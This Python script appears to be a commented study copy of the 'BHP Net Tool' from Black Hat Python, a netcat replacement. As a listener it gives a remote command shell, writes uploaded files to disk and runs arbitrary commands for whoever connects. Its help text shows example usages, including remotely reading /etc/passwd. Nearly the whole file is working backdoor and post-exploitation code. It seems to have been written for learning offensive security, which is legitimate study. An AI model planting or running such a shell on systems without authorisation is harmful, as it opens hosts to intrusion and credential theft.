import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):                 #receives a command and runs it, and returns output as string
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd),               #runs a command on the local OS and then returns the output from that command 
                                    stderr=subprocess.STDOUT)
    return output.decode()

#####client code
class NetCat:
    def __init__(self, args, buffer=None):          #initialize NetCat object with the arguments from the commandline and the buffer
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         #socket object
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):              #run method delegates execution to two methods
        if self.args.listen:
            self.listen()           #calls the listen method
        else:
            self.send()         #calls the send method

#####send method
    def send(self):
        self.socket.connect((self.args.target, self.args.port))     #connect to the target and port
        if self.buffer:                                             #if we have a buffer, we send  that to the target first
            self.socket.send(self.buffer)
        
        try:                                #set up a try/catch block so we can manually close the connection with CTRL-C
            while True:                         #start a while loopto receive data from the target
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break                   #if there is no more data, we break the while loop
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())   #otherwise, we print the response data and pause to get interactive input, send that input, and continue loop
        except KeyboardInterrupt:           #the loop will continue until the keyboardInterrupt occurs (CTRL-C), which will close the socket
            print('User terminated.')
            self.socket.close()
            sys.exit()

#####this method executes when the program runs as a listener
    def listen(self):                       #this method executes when the program runs as a listener
        self.socket.bind((self.args.target, self.args.port))        #binds the target and port
        self.socket.listen(5)

        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)       #passes the connected socket to the handle method
            )
            client_thread.start()

#####logic to perform file uploads, execute commands, and create an interactive shell
    def handle(self, client_socket):        #handle method executes the task corresponding to the command line argument it receives
        if self.args.execute:                   #if a command should be executed, the handle method passes that command to the execute function
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        elif self.args.upload:          #if a file should be uploaded, we set up a loop to listen for content on the listening socket and receive data until finished
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            with open(self.args.upload, 'wb') as f:     #then we write the content to a file
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:     #if a shell is to be created, we set up a loop, send a prompt to the sender, and wait for a command string to come back
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

#####main block responsible for handling command line arguments and calling the rest of our functions
if __name__ == '__main__':
    parser = argparse.ArgumentParser(           #creates a commandline interface
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter, 
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell        
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execeute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
            netcat.py -t 192.169.1.108 -p 5555 # connect to server
        '''))   #provides example usage that the program will display when the user invokes it with --help
    parser.add_argument('-c', '--command', action='store_true', help='command shell')       #these six arguments specify how we want the program to behave
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:             #if we're setting it up as a listener, we invoke the NetCat object with an empty buffer string
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()